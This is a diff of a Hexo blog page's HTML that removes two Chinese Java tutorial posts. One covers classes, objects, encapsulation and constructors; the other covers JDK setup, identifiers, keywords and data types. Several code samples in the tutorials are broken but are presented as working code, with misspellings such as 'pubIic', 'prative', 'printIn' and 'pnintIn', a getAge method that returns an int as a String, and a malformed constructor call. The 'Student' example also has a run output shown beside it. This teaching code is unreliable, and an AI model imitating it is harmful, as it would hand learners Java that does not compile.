+      <div class="post-nav-item">
+    <a href="/2023/07/29/buuctf-web/" rel="next" title="buuctf(web)">
+      buuctf(web) <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/29/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/29/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" class="post-title-link" itemprop="url">Java面向对象</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-07-29 12:05:32 / Modified: 15:17:04" itemprop="dateCreated datePublished" datetime="2023-07-29T12:05:32+08:00">2023-07-29</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <ul>
-<li>面向对象的三大基本特征：<ul>
-<li>封装</li>
-<li>继承</li>
-<li>多态</li>
-</ul>
-</li>
-<li>面向对象的编程思想就是把事物看作一个整体，从事物的特征（属性）和行为（方法）两个方面进行描述。</li>
-<li>面向对象的过程就是找对象、建立对象、使用对象、维护对象的关系的过程</li>
-</ul>
-<h1 id="Java-对象和类"><a href="#Java-对象和类" class="headerlink" title="Java 对象和类"></a>Java 对象和类</h1><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>类：用来描述一类具有相同特征（属性）和相同行为（方法）的对象。（可以比喻为模板）</p>
-<ul>
-<li>Java中用class关键字来描述类<ul>
-<li>成员属性（变量）：对应的就是事物的属性</li>
-<li>成员方法：对象事物的行为</li>
-</ul>
-</li>
-<li>类的定义：</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> class 类名&#123;</span><br><span class="line">    <span class="comment">//成员变量</span></span><br><span class="line">    <span class="comment">//成员方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>定义类就是定义类的成员，包括成员变量和成员方法</li>
-<li>类的成员：<ul>
-<li>成员变量：和之前定义的变量几乎时一样的，只不过位置发生了改变，成员变量位于类中，任何方法之外。</li>
-<li>成员方法：和之前定义的方法几乎是一样的，只不过把static关键字去掉</li>
-</ul>
-</li>
-<li>类和对象的关系：<ul>
-<li>类是对象的抽象</li>
-<li>对象是类的实例化</li>
-</ul>
-</li>
-</ul>
-<p>类可以看成是创建 Java 对象的模板。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pubIic <span class="keyword">class</span> <span class="title class_">Phone</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//成员变量</span></span><br><span class="line"></span><br><span class="line"> String brand;</span><br><span class="line"></span><br><span class="line"> <span class="type">int</span> price;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//成员方法</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"> System.out.printIn(“打电话”);&#125;</span><br><span class="line">​ <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendMessage</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"> System.out,pnintIn(“发短信”);&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>成员变量和局部变量的区别</strong></p>
-<table>
-<thead>
-<tr>
-<th>区别</th>
-<th>成员变量</th>
-<th>局部变量</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>类中位置不同</td>
-<td>类中方法外</td>
-<td>方法内或者方法声明上</td>
-</tr>
-<tr>
-<td>内存中位置不同</td>
-<td>堆内存</td>
-<td>栈内存</td>
-</tr>
-<tr>
-<td>生命周期不同</td>
-<td>随着对象的存在而存在，随看对象的消失而消失</td>
-<td>随着方法的调用而存在，随着方法的调用完毕而消失</td>
-</tr>
-<tr>
-<td>初始化值不同</td>
-<td>有默认的初始化值</td>
-<td>没有默认的初始化值，必须先定义，赋值，才能使用</td>
-</tr>
-</tbody></table>
-<ul>
-<li><strong>局部变量</strong>：在方法、构造方法或者语句块中定义的变量被称为局部变量。变量声明和初始化都是在方法中，方法结束后，变量就会自动销毁。</li>
-<li><strong>成员变量</strong>：成员变量是定义在类中，方法体之外的变量。这种变量在创建对象的时候实例化。成员变量可以被类中方法、构造方法和特定类的语句块访问。</li>
-<li><strong>类变量</strong>：类变量也声明在类中，方法体之外，但必须声明为 static 类型。</li>
-</ul>
-<hr>
-<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>对象（Object）是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位。</p>
-<p>它们是有形的，如一个人、一件物品；也可以是无形的，如一个计划、一次交易。（<strong>万事万物，皆对象</strong>）</p>
-<ul>
-<li>创建对象</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类名 对象名 = <span class="keyword">new</span> 类名();</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用对象：</li>
-</ul>
-<p>调用成员变量:</p>
-<blockquote>
-<p>对象名.成员变量；</p>
-</blockquote>
-<p>调用成员方法：</p>
-<blockquote>
-<p>对象名.方法名(参数列表);</p>
-</blockquote>
-<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>格式:类名对象名 &#x3D; new 类名0;<br>范例: Phone p &#x3D; new Phone0;</p>
-<h2 id="使用对象"><a href="#使用对象" class="headerlink" title="使用对象"></a>使用对象</h2><ol>
-<li><strong>使用成员变量</strong><br>格式:对象名.变量名<br>范例:p.brand</li>
-<li><strong>使用成员方法</strong><br>格式:对象名.方法名()<br>范例: p.call()</li>
-</ol>
-<hr>
-<h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><h2 id="一、private关键字"><a href="#一、private关键字" class="headerlink" title="一、private关键字"></a>一、private关键字</h2><ul>
-<li>是一个权限修饰符</li>
-<li>可以修饰成员 (成员变量和成员方法)</li>
-<li>作用是保护成员不被别的类使用，被private修饰的成员只在本类中才能访问</li>
-</ul>
-<p>针对<code>private</code>修饰的成员变量，如果需要被其他类使用，提供相应的操作</p>
-<ul>
-<li>提供“<code>get变量名()</code>”方法，用于获取成员变量的值，方法用<code>public</code>修饰</li>
-<li>提供“<code>set变量名(参数)</code>”方法，用于设置成员变量的值，方法用<code>public</code>修饰</li>
-</ul>
-<h2 id="二、this关键字"><a href="#二、this关键字" class="headerlink" title="二、this关键字"></a>二、this关键字</h2><ol>
-<li>this修饰的变量用于指代成员变量<br>方法的形参如果与成员变量同名，不带this修饰的变量指的是形参，而不是成员变量<br>方法的形参没有与成员变量同名，不带this修饰的变量指的是成员变量</li>
-<li>什么时候使用this呢? <strong>解决局部变量隐藏成员变量</strong></li>
-<li>this 代表所在类的对象引用<br>记住:方法被哪个对象调用，this就代表哪个对象</li>
-</ol>
-<h2 id="三、封装"><a href="#三、封装" class="headerlink" title="三、封装"></a>三、封装</h2><ol>
-<li><strong>封装概述</strong><br>是面向对象三大特征之一 (封装，继承，多态)<br>是面向对象编程语言对客观世界的横拟，客观世界里成员变量都是隐藏在对象内部的，外界是无法直接操作</li>
-<li><strong>封装规则</strong><br>将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对的冠信息的操作和访问成员变量private，提供对应的getXxx()&#x2F;setXxx()方法</li>
-<li><strong>好处</strong><br>通过方法来控制成员变量的操作，提高了代码的安全性<br>把代码用方法进行封装，提高了代码的复用性</li>
-</ol>
-<h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>在创建一个对象的时候，至少要调用一个构造方法。构造方法的名称必须与类同名，一个类可以有多个构造方法。</p>
-<p>下面是一个构造方法示例：</p>
-<p>public class Student{</p>
-<p> public Student(){ }</p>
-<p> public Student(String name){</p>
-<p> &#x2F;&#x2F; 这个构造器仅有一个参数：name } }</p>
-<p><strong>注意事项</strong>：</p>
-<ol>
-<li><p>构造方法的创建</p>
-<p>如果没有定义构造方法，系统将给出一个认的无参数构造方法<br>如果定义了构造方法，系统将不再提供默认的构造方法</p>
-</li>
-<li><p>构造方法的重载<br>如果自定义了带参构造方法，还要使用无参数构造方法，就必须再写一个无参数构造方法</p>
-</li>
-<li><p>推荐的使用方式<br>无论是否使用，都手工书写无参数构造方法</p>
-</li>
-</ol>
-<h5 id="标准类制作"><a href="#标准类制作" class="headerlink" title="标准类制作"></a>标准类制作</h5><ol>
-<li>成员变量<br>使用private修饰</li>
-<li>构造方法<br>提供一个无参构造方法<br>提供一个带多个参数的构造方法</li>
-<li>成员方法<br>提供每一个成员变量对应的setXxx()&#x2F;getXxx()<br>提供一个显示对象信息的show()</li>
-<li>创建对象并为其成员变量值的两种方式<br>无参构造方法创建对象后使用setXxx()赋值<br>使用带参构造方法直接创建带有属性值的对象</li>
-</ol>
-<p>例子：</p>
-<h5 id="Student-java程序"><a href="#Student-java程序" class="headerlink" title="Student.java程序"></a>Student.java程序</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line"></span><br><span class="line"> prative String name;<span class="comment">//成员变量</span></span><br><span class="line"></span><br><span class="line"> prative <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123; &#125;<span class="comment">//构造方法</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">this</span>.name = name;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">this</span>.age = age;&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//成员方法</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">this</span>.name = name;&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> name;&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">this</span>.age = age;&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> age;&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"> System.out.println(name+”,”+age);&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="StudentDemo-java程序"><a href="#StudentDemo-java程序" class="headerlink" title="StudentDemo.java程序"></a>StudentDemo.java程序</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.XXX</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentDemo</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[ ] args)</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//无参构造方法创建对象后使用setXxx()赋值</span></span><br><span class="line"></span><br><span class="line"> <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>( );</span><br><span class="line"></span><br><span class="line"> s1.setName(“xuan”);</span><br><span class="line"></span><br><span class="line"> s1.setAge(<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"> s1.show();</span><br><span class="line"></span><br><span class="line"> <span class="comment">//使用带参构造方法直接创建带有属性值的对象</span></span><br><span class="line"></span><br><span class="line"> <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(“name:”xuan”,age:<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"> s2.show();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>运行结果</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xuan,18</span><br><span class="line"></span><br><span class="line">xuan,18</span><br></pre></td></tr></table></figure>
-<h2 id="源文件声明规则"><a href="#源文件声明规则" class="headerlink" title="源文件声明规则"></a><strong>源文件声明规则</strong></h2><p>在本节的最后部分，我们将学习源文件的声明规则。当在一个源文件中定义多个类，并且还有import语句和package语句时，要特别注意这些规则。</p>
-<ul>
-<li>一个源文件中只能有一个 public 类</li>
-<li>一个源文件可以有多个非 public 类</li>
-<li>源文件的名称应该和 public 类的类名保持一致。例如：源文件中 public 类的类名是 Employee，那么源文件应该命名为Employee.java。</li>
-<li>如果一个类定义在某个包中，那么 package 语句应该在源文件的首行。</li>
-<li>如果源文件包含 import 语句，那么应该放在 package 语句和类定义之间。如果没有 package 语句，那么 import 语句应该在源文件中最前面。</li>
-<li>import 语句和 package 语句对源文件中定义的所有类都有效。在同一源文件中，不能给不同的类不同的包声明。</li>
-</ul>
-<p>类有若干种访问级别，并且类也分不同的类型：抽象类和 final 类等。这些将在访问控制章节介绍。</p>
-<p>除了上面提到的几种类型，Java 还有一些特殊的类，如：<a target="_blank" rel="noopener" href="https://www.runoob.com/java/java-inner-class.html">内部类</a>、<a target="_blank" rel="noopener" href="https://www.runoob.com/java/java-anonymous-class.html">匿名类</a>。</p>
-<hr>
-<h2 id="Java-包"><a href="#Java-包" class="headerlink" title="Java 包"></a>Java 包</h2><p>包主要用来对类和接口进行分类。当开发 Java 程序时，可能编写成百上千的类，因此很有必要对类和接口进行分类。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/29/Java/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/29/Java/" class="post-title-link" itemprop="url">Java</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-07-29 12:01:09 / Modified: 14:02:46" itemprop="dateCreated datePublished" datetime="2023-07-29T12:01:09+08:00">2023-07-29</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><p>Java的三大版本</p>
-<ul>
-<li><p>JavaSE：标准版</p>
-</li>
-<li><p>JavaME：嵌入式开发</p>
-</li>
-<li><p>JavaEE：企业级开发</p>
-</li>
-</ul>
-<h1 id="JDK、JRE、JVM"><a href="#JDK、JRE、JVM" class="headerlink" title="JDK、JRE、JVM"></a>JDK、JRE、JVM</h1><p>JDK：Java Development Kit</p>
-<p>JRE：Java Runtime Environment</p>
-<p>JVM：Java Virtual Machine</p>
-<p><img src="https://img-blog.csdnimg.cn/20201028173434536.png?x-oss-process&#61;image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX3poYW5nNjY&#61;,size_16,color_FFFFFF,t_70#pic_center" alt="img"></p>
-<h1 id="Java开发环境搭建"><a href="#Java开发环境搭建" class="headerlink" title="Java开发环境搭建"></a>Java开发环境搭建</h1><h2 id="JDK下载与安装"><a href="#JDK下载与安装" class="headerlink" title="JDK下载与安装"></a>JDK下载与安装</h2><ol>
-<li>百度搜索JDK，找到下载地址</li>
-<li>下载，记住安装路径</li>
-<li>配置环境变量</li>
-</ol>
-<h2 id="卸载JDK"><a href="#卸载JDK" class="headerlink" title="卸载JDK"></a>卸载JDK</h2><ol>
-<li>删除Java的安装目录</li>
-<li>删除环境变量中的JAVA_HOME</li>
-<li>删除path下关于java的目录</li>
-<li>cmd java -version</li>
-</ol>
-<h1 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h1><ol>
-<li><p>新建java文件</p>
-</li>
-<li><p>编写代码</p>
-</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;Hello,world!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//文件名和类名必须一致 类名 class</span></span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>终端运行：</li>
-</ol>
-<p>在文件路径下</p>
-<p>编译：<code>javac Hello.java</code></p>
-<p>运行：<code>java Hello</code></p>
-<h1 id="使用IDEA开发"><a href="#使用IDEA开发" class="headerlink" title="使用IDEA开发"></a>使用IDEA开发</h1><p>IDEA下载：<a target="_blank" rel="noopener" href="https://www.jetbrains.com/">https://www.jetbrains.com/</a></p>
-<p>IDEA快捷输入</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//psvm</span></span><br><span class="line">pubilc <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sout</span></span><br><span class="line">System.out.println();</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="编译型语言和解释型语言"><a href="#编译型语言和解释型语言" class="headerlink" title="编译型语言和解释型语言"></a>编译型语言和解释型语言</h1><ul>
-<li>有的编程语言要求必须提前将所有源代码一次性转换成二进制指令，也就是生成一个可执行程序（Windows 下的 .exe），比如C语言、C++、Golang、Pascal（Delphi）、汇编等，这种编程语言称为编译型语言，使用的转换工具称为编译器</li>
-<li>有的编程语言可以一边执行一边转换，需要哪些源代码就转换哪些源代码，不会生成可执行程序，比如 Python、JavaScript、PHP、Shell、MATLAB等，这种编程语言称为解释型语言，使用的转换工具称为解释器。</li>
-</ul>
-<p>bat ，sh，python，php，</p>
-<blockquote>
-<p>简单理解，编译器就是一个“翻译工具”，类似于将中文翻译成英文、将英文翻译成俄文。但是，翻译源代码是一个复杂的过程，大致包括词法分析、语法分析、语义分析、性能优化、生成可执行文件等五个步骤，期间涉及到复杂的算法和硬件架构。解释器也是一样，可以参考《编译原理》</p>
-</blockquote>
-<p>但是，我们要学的<code>java</code>和<code>c#</code>属于<code>半编译半解释型</code>的语言，</p>
-<p>根据这种特性，源代码需要先转换成一种中间文件（字节码文件），然后再将中间文件拿到虚拟机中执行。Java 引领了这种风潮，它的初衷是在跨平台的同时兼顾执行效率；C# 是后来的跟随者，但是 C# 一直止步于 Windows 平台。</p>
-<img src="C:\Users\tsl\AppData\Roaming\Typora\typora-user-images\image-20230729121444429.png" alt="image-20230729121444429" style="zoom:67%;" />
-
-
-
-
-
-
-
-<h1 id="Java基础语法"><a href="#Java基础语法" class="headerlink" title="Java基础语法"></a>Java基础语法</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改注释颜色</span><br><span class="line">Setting -&gt; Editor -&gt; Color Scheme -&gt; java -&gt; comment  </span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li><p>单行注释  <code>//</code></p>
-</li>
-<li><p>多行注释 <code>/*  */</code></p>
-</li>
-<li><p>JavaDoc  文档注释   <code>/**  */</code></p>
-<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230719190844222.png" alt="image-20230719190844222"></p>
-</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>关键词</p>
-<ol>
-<li>标识符：</li>
-</ol>
-<ul>
-<li>在java语言中，用来标志类名、对象名、变量名、方法名、类型名、数组名、包名的有效字符序列，称为“标识符”；</li>
-<li>标识符由字母、数字、下划线、美元符号组成，且第一个字符不能是数字；</li>
-<li>java语言区分大小写；</li>
-<li>标志符命名规则：类名首字母大写，变量名和方法名采用驼峰标志法，常量全大写，多个单词之间用“_”隔开，包名全小写；</li>
-</ul>
-<ol start="2">
-<li>关键字：<ul>
-<li>在java语言中，有一些专门的词汇已经被赋予了特殊的含义，不能再使用这些词汇来命名标识符，这些专有词汇，称为“关键字”；</li>
-<li>java有50个关键字和3个保留字，均不能用来命名标识符；</li>
-</ul>
-</li>
-</ol>
-<table>
-<thead>
-<tr>
-<th>abstract</th>
-<th>assert</th>
-<th>boolean</th>
-<th>break</th>
-<th>byte</th>
-<th>case</th>
-<th>catch</th>
-<th>char</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>class</td>
-<td>const</td>
-<td>continue</td>
-<td>default</td>
-<td>do</td>
-<td>double</td>
-<td>else</td>
-<td>enum</td>
-</tr>
-<tr>
-<td>extends</td>
-<td>final</td>
-<td>finally</td>
-<td>float</td>
-<td>for</td>
-<td>goto</td>
-<td>if</td>
-<td>implements</td>
-</tr>
-<tr>
-<td>import</td>
-<td>instanceof</td>
-<td>int</td>
-<td>interface</td>
-<td>long</td>
-<td>native</td>
-<td>new</td>
-<td>package</td>
-</tr>
-<tr>
-<td>private</td>
-<td>protected</td>
-<td>public</td>
-<td>return</td>
-<td>short</td>
-<td>static</td>
-<td>strictfp</td>
-<td>super</td>
-</tr>
-<tr>
-<td>switch</td>
-<td>synchronized</td>
-<td>this</td>
-<td>throw</td>
-<td>throws</td>
-<td>transient</td>
-<td>try</td>
-<td>void</td>
-</tr>
-<tr>
-<td>volatile</td>
-<td>while</td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<p>注意：标识符大小写区分敏感</p>
-<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/111551540305483.png?raw=true"></p>
-<p>基本类型：</p>
-<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/111613396559525.jpg?raw=true"></p>
-<ul>
-<li><p>整数类型：</p>
-<ul>
-<li>byte   <code>Byte</code></li>
-<li>short</li>
-<li>int  <code>Integer</code></li>
-<li>long</li>
-</ul>
-<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/111614085157774.png?raw=true"></p>
-</li>
-<li><p>浮点类型：</p>
-<ul>
-<li>float</li>
-<li>double</li>
-</ul>
-<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/4034970a304e251fee26fec4aa86c9177f3e533c.jpg?raw=true"></p>
-</li>
-<li><p>字符类型：<br>char</p>
-</li>
-<li><p>bool类型：<br>boolean</p>
-</li>
-</ul>
-<p>引用类型</p>
-<ul>
-<li>类</li>
-<li>接口</li>
-<li>数组</li>
-</ul>
-<p>整数扩展：</p>
-<p>二进制：0b  八进制：0     十六进制：0x</p>
-<p>浮点数扩展：</p>
-<p>BigDecimal</p>
-<p>字符扩展：<br>Unicode编码 </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> <span class="string">&#x27;\u0061&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="数据类型间的转换"><a href="#数据类型间的转换" class="headerlink" title="数据类型间的转换"></a>数据类型间的转换</h2><ol>
-<li>自动类型转换（低到高）</li>
-</ol>
-<p><img src="https://b3logfile.com/file/2020/09/image20200906213827788-6f0eca3c.png?imageView2/2/w/1280/format/jpg/interlace/1/q/100"></p>
-<ol start="2">
-<li>强制类型转换（高到低）</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo03</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">22</span>;</span><br><span class="line">        <span class="type">float</span> <span class="variable">f</span> <span class="operator">=</span> <span class="number">78.98f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> b + i + (<span class="type">int</span>)f;     <span class="comment">//此处对f使用了强制类型转换(int)f，转换后的值为78</span></span><br><span class="line">        System.out.prinln(<span class="string">&quot;res: &quot;</span>+res)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
